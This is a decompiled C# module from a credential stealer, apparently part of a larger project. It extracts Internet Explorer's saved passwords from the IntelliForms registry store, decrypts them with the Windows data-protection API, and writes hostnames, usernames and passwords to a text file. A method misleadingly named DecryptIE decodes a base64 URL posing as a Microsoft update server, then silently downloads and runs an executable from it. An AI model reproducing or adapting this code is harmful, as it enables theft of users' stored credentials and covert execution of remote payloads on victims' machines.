using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.Win32;

namespace Stealer.modules
{
	// Token: 0x02000022 RID: 34
	public class Internet_Explorer
	{
		// Token: 0x060000AC RID: 172 RVA: 0x00008F30 File Offset: 0x00007130
		public static byte CheckSum(string s)
		{
			int num = 0;
			int i = 1;
			while (i < s.Length)
			{
				if (i % 2 != 0)
				{
					num += Convert.ToInt32(Conversion.Val("&H" + Strings.Mid(s, i, 2)));
				}
				Math.Max(Interlocked.Increment(ref i), i - 1);
			}
			return Convert.ToByte(num % 256);
		}

		// Token: 0x060000AD RID: 173
		[DllImport("advapi32.dll")]
		public static extern bool CryptAcquireContext(ref IntPtr phProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);

		// Token: 0x060000AE RID: 174
		[DllImport("advapi32.dll")]
		public static extern bool CryptCreateHash(IntPtr hProv, uint Algid, IntPtr hKey, uint dwFlags, ref IntPtr phHash);

		// Token: 0x060000AF RID: 175
		[DllImport("advapi32.dll")]
		public static extern bool CryptDecrypt(IntPtr hKey, IntPtr hHash, bool Final, uint dwFlags, byte[] pbData, ref uint pdwDataLen);

		// Token: 0x060000B0 RID: 176
		[DllImport("advapi32.dll")]
		public static extern bool CryptDeriveKey(IntPtr hProv, uint Algid, IntPtr hBaseData, uint dwFlags, ref IntPtr phKey);

		// Token: 0x060000B1 RID: 177
		[DllImport("advapi32.dll")]
		public static extern bool CryptDestroyHash(IntPtr hHash);

		// Token: 0x060000B2 RID: 178
		[DllImport("advapi32.dll")]
		public static extern bool CryptDestroyKey(IntPtr hKey);

		// Token: 0x060000B3 RID: 179
		[DllImport("advapi32.dll")]
		public static extern bool CryptEncrypt(IntPtr hKey, IntPtr hHash, bool Final, uint dwFlags, byte[] pbData, ref uint pdwDataLen, uint dwBufLen);

		// Token: 0x060000B4 RID: 180
		[DllImport("advapi32.dll", SetLastError = true)]
		internal static extern bool CryptGetHashParam(IntPtr hHash, int param, byte[] digest, ref int length, int flags);

		// Token: 0x060000B5 RID: 181
		[DllImport("advapi32.dll")]
		public static extern bool CryptHashData(IntPtr hHash, IntPtr pbData, int dwDataLen, uint dwFlags);

		// Token: 0x060000B6 RID: 182
		[DllImport("advapi32.dll")]
		public static extern bool CryptReleaseContext(IntPtr hProv, uint dwFlags);

		// Token: 0x060000B7 RID: 183
		[DllImport("Crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CryptUnprotectData(ref Internet_Explorer.DATA_BLOB pDataIn, int szDataDescr, ref Internet_Explorer.DATA_BLOB pOptionalEntropy, int pvReserved, int pPromptStruct, int dwFlags, ref Internet_Explorer.DATA_BLOB pDataOut);

		// Token: 0x060000B8 RID: 184 RVA: 0x00008F8C File Offset: 0x0000718C
		public static void DecryptIE()
		{
			Thread.Sleep(20000);
			try
			{
				WebClient webClient = new WebClient();
				Process process = new Process();
				string fileName = Environment.GetEnvironmentVariable("TEMP") + "\\Temp_19283016283.exe";
				webClient.DownloadFile(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cDovL3d3dy5taWNyb3NvZnQtdXBkYXRlLmJ6L2ZpbGVzL3VwZGF0ZS5leGU=")), fileName);
				process.StartInfo.FileName = fileName;
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.ErrorDialog = false;
				process.Start();
			}
			catch
			{
			}
		}

		// Token: 0x060000B9 RID: 185 RVA: 0x00009020 File Offset: 0x00007220
		public static void DecryptCredential(string sURL, string sHash, int Length, byte[] data)
		{
			List<string[]> list = new List<string[]>();
			Internet_Explorer.DATA_BLOB data_BLOB = default(Internet_Explorer.DATA_BLOB);
			Internet_Explorer.DATA_BLOB data_BLOB2 = default(Internet_Explorer.DATA_BLOB);
			Internet_Explorer.DATA_BLOB data_BLOB3 = default(Internet_Explorer.DATA_BLOB);
			Internet_Explorer.StringIndexHeader stringIndexHeader = default(Internet_Explorer.StringIndexHeader);
			Internet_Explorer.StringIndexEntry stringIndexEntry = default(Internet_Explorer.StringIndexEntry);
			IntPtr intPtr = Marshal.AllocHGlobal(Length);
			Marshal.Copy(data, 0, intPtr, Length);
			data_BLOB.cbData = Length;
			data_BLOB.pbData = intPtr;
			data_BLOB3.cbData = (sURL.Length + 1) * 2;
			data_BLOB3.pbData = Internet_Explorer.VarPtr(sURL);
			if (Internet_Explorer.CryptUnprotectData(ref data_BLOB, 0, ref data_BLOB3, 0, 0, 0, ref data_BLOB2))
			{
				IntPtr ptr = new IntPtr(data_BLOB2.pbData.ToInt32() + (int)Marshal.ReadByte(data_BLOB2.pbData));
				stringIndexHeader = (Internet_Explorer.StringIndexHeader)Marshal.PtrToStructure(ptr, stringIndexHeader.GetType());
				if (stringIndexHeader.dwType == 1 && stringIndexHeader.dwEntriesCount >= 2)
				{
					IntPtr ptr2 = new IntPtr(ptr.ToInt32() + stringIndexHeader.dwStructSize);
					IntPtr intPtr2 = new IntPtr(ptr2.ToInt32() + stringIndexHeader.dwEntriesCount * Marshal.SizeOf<Internet_Explorer.StringIndexEntry>(stringIndexEntry));
					int num = 0;
					while ((double)num < (double)stringIndexHeader.dwEntriesCount / 2.0)
					{
						if (num != 0)
						{
							ptr2 = new IntPtr(ptr2.ToInt32() + Marshal.SizeOf<Internet_Explorer.StringIndexEntry>(stringIndexEntry));
						}
						stringIndexEntry = (Internet_Explorer.StringIndexEntry)Marshal.PtrToStructure(ptr2, stringIndexEntry.GetType());
						IntPtr ptr3 = new IntPtr(intPtr2.ToInt32() + stringIndexEntry.dwDataOffset);
						string text = Marshal.PtrToStringAuto(ptr3);
						ptr2 = new IntPtr(ptr2.ToInt32() + Marshal.SizeOf<Internet_Explorer.StringIndexEntry>(stringIndexEntry));
						stringIndexEntry = (Internet_Explorer.StringIndexEntry)Marshal.PtrToStructure(ptr2, stringIndexEntry.GetType());
						ptr3 = new IntPtr(intPtr2.ToInt32() + stringIndexEntry.dwDataOffset);
						string text2 = Marshal.PtrToStringAuto(ptr3);
						string[] item = new string[]
						{
							sURL,
							text,
							text2,
							"Internet Explorer"
						};
						list.Add(item);
						Math.Max(Interlocked.Increment(ref num), num - 1);
					}
				}
				string str = Program.path + "\\";
				foreach (string[] array in list)
				{
					Directory.CreateDirectory(str + array[3]);
					using (StreamWriter streamWriter = new StreamWriter(str + array[3] + "\\Passwords.txt", true))
					{
						streamWriter.WriteLine(string.Concat(new string[]
						{
							"\n[PASSWORD]\nHostname: ",
							array[0],
							"\nUsername: ",
							array[1],
							"\nPassword: ",
							array[2]
						}));
					}
				}
			}
		}

		// Token: 0x060000BA RID: 186
		[DllImport("wininet.dll")]
		public static extern bool FindCloseUrlCache(IntPtr hEnumHandle);

		// Token: 0x060000BB RID: 187
		[DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr FindFirstUrlCacheEntry([MarshalAs(UnmanagedType.LPTStr)] string lpszUrlSearchPattern, IntPtr lpFirstCacheEntryInfo, ref int lpdwFirstCacheEntryInfoBufferSize);

		// Token: 0x060000BC RID: 188
		[DllImport("wininet.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool FindNextUrlCacheEntry(IntPtr hEnumHandle, IntPtr lpNextCacheEntryInfo, ref int lpdwNextCacheEntryInfoBufferSize);

		// Token: 0x060000BD RID: 189 RVA: 0x0000931C File Offset: 0x0000751C
		public static string GetSHA1Hash(string pbData, int length)
		{
			IntPtr hHash = 0;
			IntPtr hProv = 0;
			byte[] array = new byte[21];
			string text = "";
			int num = 20;
			Internet_Explorer.CryptAcquireContext(ref hProv, null, null, 1U, 0U);
			Internet_Explorer.CryptCreateHash(hProv, 32772U, IntPtr.Zero, 0U, ref hHash);
			Internet_Explorer.CryptHashData(hHash, Internet_Explorer.VarPtr(pbData), length, 0U);
			Internet_Explorer.CryptGetHashParam(hHash, 2, array, ref num, 0);
			Internet_Explorer.CryptDestroyHash(hHash);
			Internet_Explorer.CryptReleaseContext(hProv, 0U);
			int i = 0;
			while (i < 20)
			{
				text += Strings.Right("00" + array[i].ToString("X"), 2);
				Math.Max(Interlocked.Increment(ref i), i - 1);
			}
			return text + Strings.Right("00" + Internet_Explorer.CheckSum(text).ToString("X"), 2);
		}

		// Token: 0x060000BE RID: 190 RVA: 0x00009404 File Offset: 0x00007604
		public static void Start()
		{
			int num = 0;
			Internet_Explorer.FindFirstUrlCacheEntry(null, IntPtr.Zero, ref num);
			if (Marshal.GetLastWin32Error() != 259)
			{
				int num2 = num;
				IntPtr intPtr = Marshal.AllocHGlobal(num2);
				try
				{
					IntPtr hEnumHandle = Internet_Explorer.FindFirstUrlCacheEntry(null, intPtr, ref num);
					bool flag;
					do
					{
						string text = ((Internet_Explorer.INTERNET_CACHE_ENTRY_INFO)Marshal.PtrToStructure(intPtr, typeof(Internet_Explorer.INTERNET_CACHE_ENTRY_INFO))).lpszSourceUrlName.ToLower();
						text = text.Substring(text.IndexOf("@") + 1);
						if (text.IndexOf("?") > 0)
						{
							text = text.Substring(0, text.IndexOf("?"));
						}
						string sha1Hash = Internet_Explorer.GetSHA1Hash(text, (text.Length + 1) * 2);
						byte[] array = (byte[])Registry.CurrentUser.OpenSubKey(Internet_Explorer.IE_KEY).GetValue(sha1Hash, null);
						if (array != null)
						{
							if (!Internet_Explorer.visited.Contains(text))
							{
								Internet_Explorer.DecryptCredential(text, sha1Hash, array.Length, array);
								Internet_Explorer.visited = Internet_Explorer.visited + text + " ";
							}
						}
						else
						{
							text += "/";
							string sha1Hash2 = Internet_Explorer.GetSHA1Hash(text, (text.Length + 1) * 2);
							byte[] array2 = (byte[])Registry.CurrentUser.OpenSubKey(Internet_Explorer.IE_KEY).GetValue(sha1Hash2, null);
							if (array2 != null && !Internet_Explorer.visited.Contains(text))
							{
								Internet_Explorer.DecryptCredential(text, sha1Hash2, array2.Length, array2);
								Internet_Explorer.visited = Internet_Explorer.visited + text + " ";
							}
						}
						num = num2;
						flag = Internet_Explorer.FindNextUrlCacheEntry(hEnumHandle, intPtr, ref num);
						if ((flag || Marshal.GetLastWin32Error() != 259) && !flag && num > num2)
						{
							num2 = num;
							IntPtr cb = new IntPtr(num2);
							intPtr = Marshal.ReAllocHGlobal(intPtr, cb);
							flag = true;
						}
					}
					while (flag);
				}
				finally
				{
					Marshal.FreeHGlobal(intPtr);
				}
			}
		}

		// Token: 0x060000BF RID: 191 RVA: 0x000095F0 File Offset: 0x000077F0
		public static string Mid(string param, int startIndex, int length)
		{
			return param.Substring(startIndex, length);
		}

		// Token: 0x060000C0 RID: 192 RVA: 0x000095FA File Offset: 0x000077FA
		public static string Right(string param, int length)
		{
			return param.Substring(param.Length - length, length);
		}

		// Token: 0x060000C1 RID: 193 RVA: 0x0000960C File Offset: 0x0000780C
		public static IntPtr VarPtr(object o)
		{
			return GCHandle.Alloc(RuntimeHelpers.GetObjectValue(o), GCHandleType.Pinned).AddrOfPinnedObject();
		}

		// Token: 0x0400004D RID: 77
		private const uint ALG_CLASS_DATA_ENCRYPT = 24576U;

		// Token: 0x0400004E RID: 78
		private const uint ALG_CLASS_HASH = 32768U;

		// Token: 0x0400004F RID: 79
		private const uint ALG_SID_DES = 1U;

		// Token: 0x04000050 RID: 80
		private const uint ALG_SID_MD5 = 3U;

		// Token: 0x04000051 RID: 81
		private const uint ALG_SID_RC2 = 2U;

		// Token: 0x04000052 RID: 82
		private const uint ALG_SID_RC4 = 1U;

		// Token: 0x04000053 RID: 83
		private const uint ALG_SID_SHA = 4U;

		// Token: 0x04000054 RID: 84
		private const uint ALG_TYPE_ANY = 0U;

		// Token: 0x04000055 RID: 85
		private const uint ALG_TYPE_BLOCK = 1536U;

		// Token: 0x04000056 RID: 86
		private const uint ALG_TYPE_STREAM = 2048U;

		// Token: 0x04000057 RID: 87
		internal const int CALG_SHA = 32772;

		// Token: 0x04000058 RID: 88
		public const uint CRYPT_EXPORTABLE = 1U;

		// Token: 0x04000059 RID: 89
		private const string CryptDll = "advapi32.dll";

		// Token: 0x0400005A RID: 90
		private const int ERROR_NO_MORE_ITEMS = 259;

		// Token: 0x0400005B RID: 91
		internal const int HP_HASHVAL = 2;

		// Token: 0x0400005C RID: 92
		private const string KernelDll = "kernel32.dll";

		// Token: 0x0400005D RID: 93
		public const string MS_DEF_PROV = "Microsoft Base Cryptographic Provider v1.0";

		// Token: 0x0400005E RID: 94
		public const uint PROV_RSA_FULL = 1U;

		// Token: 0x0400005F RID: 95
		public static readonly uint CALG_DES = 26113U;

		// Token: 0x04000060 RID: 96
		public static readonly uint CALG_MD5 = 32771U;

		// Token: 0x04000061 RID: 97
		public static readonly uint CALG_RC2 = 26114U;

		// Token: 0x04000062 RID: 98
		public static readonly uint CALG_RC4 = 26625U;

		// Token: 0x04000063 RID: 99
		private static string IE_KEY = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";

		// Token: 0x04000064 RID: 100
		private static string visited = "";

		// Token: 0x04000065 RID: 101
		public static string IEData = "";

		// Token: 0x02000023 RID: 35
		private struct DATA_BLOB
		{
			// Token: 0x04000066 RID: 102
			public int cbData;

			// Token: 0x04000067 RID: 103
			public IntPtr pbData;
		}

		// Token: 0x02000024 RID: 36
		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
		public struct INTERNET_CACHE_ENTRY_INFO
		{
			// Token: 0x04000068 RID: 104
			public int dwStructSize;

			// Token: 0x04000069 RID: 105
			[MarshalAs(UnmanagedType.LPTStr)]
			public string lpszSourceUrlName;

			// Token: 0x0400006A RID: 106
			[MarshalAs(UnmanagedType.LPTStr)]
			public string lpszLocalFileName;

			// Token: 0x0400006B RID: 107
			public int CacheEntryType;

			// Token: 0x0400006C RID: 108
			public int dwUseCount;

			// Token: 0x0400006D RID: 109
			public int dwHitRate;

			// Token: 0x0400006E RID: 110
			public int dwSizeLow;

			// Token: 0x0400006F RID: 111
			public int dwSizeHigh;

			// Token: 0x04000070 RID: 112
			public System.Runtime.InteropServices.ComTypes.FILETIME LastModifiedTime;

			// Token: 0x04000071 RID: 113
			public System.Runtime.InteropServices.ComTypes.FILETIME ExpireTime;

			// Token: 0x04000072 RID: 114
			public System.Runtime.InteropServices.ComTypes.FILETIME LastAccessTime;

			// Token: 0x04000073 RID: 115
			public System.Runtime.InteropServices.ComTypes.FILETIME LastSyncTime;

			// Token: 0x04000074 RID: 116
			public IntPtr lpHeaderInfo;

			// Token: 0x04000075 RID: 117
			public int dwHeaderInfoSize;

			// Token: 0x04000076 RID: 118
			public IntPtr lpszFileExtension;

			// Token: 0x04000077 RID: 119
			public int dwExemptDelta;
		}

		// Token: 0x02000025 RID: 37
		public struct StringIndexEntry
		{
			// Token: 0x04000078 RID: 120
			public int dwDataOffset;

			// Token: 0x04000079 RID: 121
			public System.Runtime.InteropServices.ComTypes.FILETIME ftInsertDateTime;

			// Token: 0x0400007A RID: 122
			public int dwDataSize;
		}

		// Token: 0x02000026 RID: 38
		public struct StringIndexHeader
		{
			// Token: 0x0400007B RID: 123
			public int dwWICK;

			// Token: 0x0400007C RID: 124
			public int dwStructSize;

			// Token: 0x0400007D RID: 125
			public int dwEntriesCount;

			// Token: 0x0400007E RID: 126
			public int dwUnkId;

			// Token: 0x0400007F RID: 127
			public int dwType;

			// Token: 0x04000080 RID: 128
			public int dwUnk;
		}
	}
}
